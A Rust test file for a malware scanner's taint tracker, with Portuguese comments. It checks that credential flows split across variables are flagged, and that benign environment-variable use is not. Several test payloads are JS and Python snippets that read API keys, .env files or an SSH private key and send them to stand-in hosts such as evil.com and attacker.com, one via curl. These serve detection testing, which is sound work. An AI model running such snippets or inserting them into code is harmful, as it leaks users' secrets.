//! M5 — Testes para taint tracking (fonte→sink via variáveis)
//!
//! Testa payloads que FRAGMENTAM o caminho fonte→sink em variáveis intermediárias
//! para escapar de regex simples — exatamente o vetor que o taint tracker deve pegar.
//!
//! Positivos: payloads com variável intermediária entre fonte e sink
//! Negativos: código legítimo com env vars e network sem cadeia de credencial

use nemesis_defender::{scan_content, Severity};
use std::path::Path;

// ──────────────────────────────────────────────────────────────
// POSITIVOS — taint flow via variável deve ser MALICIOUS
// ──────────────────────────────────────────────────────────────

#[test]
fn m5_js_env_var_to_eval_via_variable() {
    let path = Path::new("malware.js");
    // A variável `cmd` recebe valor de process.env e vai para eval
    let payload = r#"
const cmd = process.env.AWS_SECRET_ACCESS_KEY;
eval(cmd);
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M5 FALHOU: process.env → variável → eval deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| (&v.visitor, &v.message))
            .collect::<Vec<_>>()
    );
    let has_taint = result
        .violations
        .iter()
        .any(|v| v.visitor == "taint_tracker");
    assert!(
        has_taint,
        "M5 FALHOU: violation taint_tracker não foi gerada. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_js_env_to_fetch_via_template_literal() {
    let path = Path::new("exfil.js");
    // Payload fragmentado: token em template literal passado para fetch
    let payload = r#"
const token = process.env.GITHUB_TOKEN;
const body = `secret=${token}&ts=${Date.now()}`;
await fetch('https://evil.io/collect', { method: 'POST', body });
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M5 FALHOU: env→template→fetch deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| (&v.visitor, &v.message))
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_js_file_read_to_fetch_via_variable() {
    let path = Path::new("steal.js");
    // Lê .env em variável, passa para axios
    let payload = r#"
const creds = require('fs').readFileSync('.env', 'utf8');
const response = await axios.post('https://attacker.com/dump', { data: creds });
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M5 FALHOU: readFileSync(.env)→variável→axios deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| (&v.visitor, &v.message))
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_js_env_propagation_two_hops() {
    let path = Path::new("exfil.js");
    // Dois hops de propagação: env → key → payload → fetch
    let payload = r#"
const apiKey = process.env.OPENAI_API_KEY;
const payload = { authorization: apiKey };
await fetch('https://evil.com/log', { method: 'POST', body: JSON.stringify(payload) });
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M5 FALHOU: env→key→payload→fetch (2 hops) deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_py_env_to_subprocess_via_variable() {
    let path = Path::new("malware.py");
    let payload = r#"
import os, subprocess
secret = os.environ.get('AWS_SECRET_ACCESS_KEY')
cmd = f"curl -X POST https://evil.com/steal -d key={secret}"
subprocess.run(cmd, shell=True)
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M5 FALHOU: os.environ→variável→subprocess deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| (&v.visitor, &v.message))
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_py_env_to_requests_via_variable() {
    let path = Path::new("exfil.py");
    let payload = r#"
import os, requests
token = os.environ.get('GITHUB_TOKEN')
data = {'token': token, 'host': 'evil.io'}
requests.post('https://c2.evil.io/collect', json=data)
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M5 FALHOU: os.environ→data dict→requests.post deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_js_file_read_ssh_key_to_exec() {
    let path = Path::new("ssh_abuse.js");
    let payload = r#"
const privateKey = require('fs').readFileSync('/home/user/.ssh/id_rsa', 'utf8');
require('child_process').exec(`ssh -i /tmp/k ${privateKey} root@attacker.com`);
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M5 FALHOU: readFileSync(id_rsa)→exec deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_js_array_fromcharcode_bypass_taint() {
    let path = Path::new("obfuscated.js");
    // Clássica evasão de regex: construir string via Array.from + charCode, mas sem variável
    // intermediária tainted — este caso é pego pelo decoder, não pelo taint tracker
    // O teste verifica que o decoder ainda pega isso
    let payload = r#"
const secret = process.env.ANTHROPIC_API_KEY;
const encoded = btoa(secret);
fetch(`https://evil.com/${encoded}`);
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M5 FALHOU: env→btoa→fetch deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

// ──────────────────────────────────────────────────────────────
// NEGATIVOS — não deve gerar falsos positivos
// ──────────────────────────────────────────────────────────────

#[test]
fn m5_allows_env_var_to_internal_comparison() {
    let path = Path::new("config.js");
    // Usa NODE_ENV para comparação — não é credencial, sem sink
    let payload = r#"
const env = process.env.NODE_ENV;
if (env === 'production') {
  console.log('Running in production');
}
"#;
    let result = scan_content(path, payload.as_bytes());
    let has_taint = result
        .violations
        .iter()
        .any(|v| v.visitor == "taint_tracker");
    assert!(
        !has_taint,
        "M5 FALSO-POSITIVO: NODE_ENV→comparação não deve gerar taint_tracker. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_allows_fetch_without_credential_source() {
    let path = Path::new("api.js");
    // fetch legítimo sem fonte de credencial
    let payload = r#"
const baseUrl = process.env.NEXT_PUBLIC_API_URL;
const data = { userId: 123, action: 'update' };
const response = await fetch(`${baseUrl}/users`, { method: 'POST', body: JSON.stringify(data) });
"#;
    let result = scan_content(path, payload.as_bytes());
    let has_taint = result
        .violations
        .iter()
        .any(|v| v.visitor == "taint_tracker");
    assert!(
        !has_taint,
        "M5 FALSO-POSITIVO: NEXT_PUBLIC_*→fetch não deve gerar taint_tracker. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_allows_python_env_for_db_config() {
    let path = Path::new("db.py");
    // Variável de ambiente para config de DB, sem sink de exec/network
    let payload = r#"
import os
db_host = os.environ.get('DATABASE_HOST', 'localhost')
db_port = int(os.environ.get('DATABASE_PORT', '5432'))
print(f"Connecting to {db_host}:{db_port}")
"#;
    let result = scan_content(path, payload.as_bytes());
    let has_taint = result
        .violations
        .iter()
        .any(|v| v.visitor == "taint_tracker");
    assert!(
        !has_taint,
        "M5 FALSO-POSITIVO: DATABASE_HOST→print não deve gerar taint_tracker. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m5_allows_stripe_sdk_initialization() {
    let path = Path::new("payments.ts");
    // Inicializar SDK com key de env — comum e legítimo
    // Nota: pode gerar violation por STRIPE_SECRET_KEY ser sensível,
    // mas o taint_tracker NÃO deve gerar violation se não há sink de exec/rede explícito
    // (SDK init é pattern legítimo — o SDK faz a chamada de rede internamente)
    let payload = r#"
import Stripe from 'stripe';
const stripeKey = process.env.STRIPE_SECRET_KEY;
const stripe = new Stripe(stripeKey);
"#;
    let result = scan_content(path, payload.as_bytes());
    // O SDK init não é um exec sink nem network sink explícito
    // taint_tracker não deve disparar para SDK initialization
    let has_taint = result
        .violations
        .iter()
        .any(|v| v.visitor == "taint_tracker");
    assert!(!has_taint,
        "M5 FALSO-POSITIVO: STRIPE_KEY→Stripe SDK init não deve gerar taint_tracker. violations={:?}",
        result.violations.iter().map(|v| &v.visitor).collect::<Vec<_>>());
}
